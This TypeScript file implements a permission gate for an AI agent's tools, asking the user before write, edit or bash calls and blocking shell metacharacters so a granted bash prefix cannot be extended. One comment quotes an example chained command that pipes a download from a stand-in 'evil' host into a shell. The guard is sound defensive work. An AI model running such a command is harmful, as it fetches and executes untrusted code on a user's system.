import type { ToolDef } from "../tools/types.ts";

export type PermDecision = { behavior: "allow"; reason: string } | { behavior: "deny"; message: string };

export type PermAnswer = "y" | "a" | "p" | "n";

export interface PermRequest {
  tool: string;
  /** One-line summary of what the call will do, for the prompt UI. */
  summary: string;
  /** Bash prefix that "p" would remember, present only for bash calls. */
  bashPrefix?: string;
}

export type Prompter = (req: PermRequest) => Promise<PermAnswer>;

/** First two whitespace-tokens of a command — what "p" (always this prefix) remembers. */
export function bashPrefixOf(command: string): string {
  const tokens = command.trim().split(/\s+/);
  return tokens.slice(0, 2).join(" ");
}

// Shell metacharacters that can chain/expand a command past the granted prefix.
// A prefix grant must NOT silently auto-allow `git status; curl evil | sh`.
const SHELL_META = /[;&|`$(){}<>\\!*?#\n\r]|\$\(|<\(/;

/** A granted prefix only auto-allows a command that is the prefix + plain args (no metachars). */
export function prefixGrantCovers(prefix: string, command: string): boolean {
  if (command !== prefix && !command.startsWith(prefix + " ")) return false;
  const rest = command.slice(prefix.length);
  return !SHELL_META.test(rest);
}

function summarize(tool: ToolDef<any>, input: Record<string, unknown>): string {
  if (tool.name === "bash") return String(input.command ?? "");
  if (typeof input.path === "string") return input.path;
  return JSON.stringify(input).slice(0, 120);
}

/**
 * read/glob/grep (mutates:false) → allow. write/edit/bash (mutates:true) → ask.
 * Answers: y once · a always-this-tool · p always-this-bash-prefix · n deny.
 * Grants are session-memory only in v1 (plan.md).
 */
export class PermissionGate {
  private allowedTools = new Set<string>();
  private bashPrefixes: string[] = [];

  constructor(private prompter: Prompter) {}

  async check(tool: ToolDef<any>, input: Record<string, unknown>): Promise<PermDecision> {
    if (!tool.mutates) return { behavior: "allow", reason: "read-only" };
    if (this.allowedTools.has(tool.name)) return { behavior: "allow", reason: "session-tool-grant" };

    const isBash = tool.name === "bash";
    const command = isBash ? String(input.command ?? "") : "";
    if (isBash && this.bashPrefixes.some((p) => prefixGrantCovers(p, command))) {
      return { behavior: "allow", reason: "session-prefix-grant" };
    }

    const prefix = isBash ? bashPrefixOf(command) : undefined;
    const answer = await this.prompter({ tool: tool.name, summary: summarize(tool, input), bashPrefix: prefix });
    switch (answer) {
      case "y":
        return { behavior: "allow", reason: "user-once" };
      case "a":
        this.allowedTools.add(tool.name);
        return { behavior: "allow", reason: "user-always-tool" };
      case "p":
        if (!isBash) return { behavior: "deny", message: "Prefix grants only apply to bash." };
        this.bashPrefixes.push(prefix!);
        return { behavior: "allow", reason: "user-always-prefix" };
      case "n":
        return { behavior: "deny", message: `User denied ${tool.name}. Ask before retrying or take a different approach.` };
    }
  }
}
